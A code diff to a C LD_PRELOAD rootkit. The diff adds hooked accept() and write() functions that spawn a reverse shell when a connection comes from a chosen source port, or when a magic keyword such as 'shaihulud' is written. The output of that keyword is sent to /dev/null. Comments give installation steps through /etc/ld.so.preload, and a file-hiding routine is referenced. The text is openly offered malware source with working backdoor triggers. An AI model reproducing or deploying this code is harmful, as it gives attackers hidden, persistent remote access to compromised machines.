@@ -2,7 +2,6 @@
 //move compiled .so to /usr/lib/
 //echo "/usr/lib/[compiled.so]" > /etc/ld.so.preload
 //export LD_PRELOAD=/path/to/rootkit.so
-//TODO: individually submerge, create worm files
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
@@ -62,15 +61,44 @@ void submerge(char const *toHide){
   closedir(dp);
 }
 
-//GET THIS WORKING
-int (*real_accept)(int, struct sockaddr *, socklen_t *);
+
+int (*real_accept)(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
 int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen){
 	real_accept = dlsym(RTLD_NEXT, "accept");
-    struct sockaddr_in * tmp = (struct sockaddr_in *)addr;
-    if(tmp && ntohs(tmp->sin_port) == SRCPORT) {
+    pid_t my_pid;
+
+    struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;
+
+    if (htons (sa_i->sin_port) == SRCPORT) {
+    my_pid = fork ();
+    if (my_pid == 0) {
+      rev_shell();
+    }
+  }
+  return real_accept(sockfd, addr, addrlen);
+}
+
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+    ssize_t (*real_write)(int fildes, const void *buf, size_t nbytes);
+
+    ssize_t result;
+
+    real_write = dlsym(RTLD_NEXT, "write");
+
+    char *rev = strstr(buf, "shaihulud");
+
+    if (rev != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = real_write(fildes, buf, nbytes);
         rev_shell();
     }
-    return real_accept(sockfd, addr, addrlen);
+    else{
+        result = real_write(fildes, buf, nbytes);
+    }
+
+    return result;
 }
 
 
